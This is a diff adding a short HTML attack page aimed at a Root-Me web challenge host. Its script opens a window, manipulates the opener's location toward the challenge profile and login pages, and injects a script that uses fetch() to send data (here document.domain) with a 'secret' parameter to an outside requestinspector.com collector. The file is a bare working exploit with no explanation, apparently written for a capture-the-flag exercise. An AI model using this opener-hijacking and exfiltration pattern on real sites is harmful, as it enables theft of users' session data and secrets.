@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<body>
+<script>
+  var bad2 = open("");
+  bad2.opener.location = "http://challenge01.root-me.org:58003/profile";
+  bad2.location = "http://challenge01.root-me.org:58003/login";
+  function myFunction(payload){
+    var newScript = document.createElement('script');
+    let url = "https://01jhb503e78kwgffsh4r85hx3p00-6bcfda00677b285b05f6.requestinspector.com?secret=";
+    newScript.innerHTML = "fetch('"+url.concat(payload)+"')";
+    document.body.appendChild(newScript);
+  }
+  bad2.opener.alert(myFunction(document.domain));
+</script>
+</body>
+</html>
